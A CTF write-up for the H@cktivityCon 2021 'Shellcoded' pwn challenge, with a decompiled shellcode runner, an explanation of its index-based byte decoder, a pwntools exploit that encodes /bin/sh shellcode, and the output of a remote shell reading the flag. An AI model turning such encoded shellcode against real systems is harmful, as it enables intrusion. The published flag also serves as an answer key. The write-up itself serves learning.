# H@cktivityCon 2021 CTF

## Shellcoded


> Give me your shellcode. I promise I'll run it! 
> 
> 379
> 
> [`shellcoded`](shellcoded)
>
> author: @M_alpha#3534

Tags: _pwn_ _shellcode_ _x86-64_ _remote-shell_


## Summary

Basic shellcode runner with a coder/decoder.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No canary, so there's BOF, but this is really a shellcoding challenge, no need to exploit any missing mitigations since they just run your shellcode for you.  See below.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  char cVar1;
  int iVar2;
  code *__buf;
  ssize_t sVar3;
  uint local_20;
  
  __buf = (code *)aligned_alloc(PAGE_SIZE,PAGE_SIZE);
  if (__buf == (code *)0x0) {
    fwrite("Failed to allocate memory.\n",1,0x1b,stderr);
    exit(1);
  }
  puts("Enter your shellcode.");
  sVar3 = read(0,__buf,PAGE_SIZE);
  if (-1 < sVar3) {
    for (local_20 = 0; (int)local_20 < sVar3; local_20 = local_20 + 1) {
      if ((local_20 & 1) == 0) {
        cVar1 = '\x01';
      }
      else {
        cVar1 = -1;
      }
      __buf[(int)local_20] = (code)((char)__buf[(int)local_20] + (char)local_20 * cVar1);
    }
    iVar2 = mprotect(__buf,PAGE_SIZE,5);
    if (iVar2 != 0) {
      free(__buf);
      fwrite("Failed to set memory permissions.\n",1,0x22,stderr);
      exit(1);
    }
    (*__buf)();
  }
  free(__buf);
  return 0;
}
```

`(*__buf)();` just runs your shellcode, however, the `for` loop above it will _decode_ your shellcode first, so you'll need to submit a _coded_ payload.

The logic is pretty basic: `decoded[i] = coded[i] +/- i`.  The plus or minus depends on if `i` is even (`(local_20 & 1) == 0`) or odd.  To create a coded version, just solve for `coded[i]`, IOW, `coded[i] = decoded[i] -/+ i` (notice how I swapped the `+/-`).

> This algorithm is symmetric, so a basic attack would be to just submit your shellcode and extract from GDB the _coded_ version and then use that for the actual challenge.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellcoded')

if args.REMOTE:
    p = remote('challenge.ctf.games', 31416)
else:
    p = process(binary.path)

shellcode = asm(shellcraft.sh())
shellcoded = [ x & 0xff for x in [ shellcode[i] + i if i & 1 else shellcode[i] - i for i in range(len(shellcode)) ]]

p.sendlineafter(b'shellcode.\n',bytearray(shellcoded))
p.interactive()
```

pwntools provided the shellcode, so no need to track that down, then for each byte, if the byte offset within the array is odd (`if i & 1`), then add `i`, else subtract.  

> The `& 0xff` is required since Python integer math is not signed 8-bit like the C source above (see the `(char)` casts above).

> The `shellcoded = [...` is python list comprehension, if the syntax is foreign to you.
> 

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/hacktivityctf2021/shellcoded/shellcoded'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenge.ctf.games on port 31416: Done
[*] Switching to interactive mode
$ cat flag.txt
flag{f27646ae277113d24c73dbc66a816721}
```
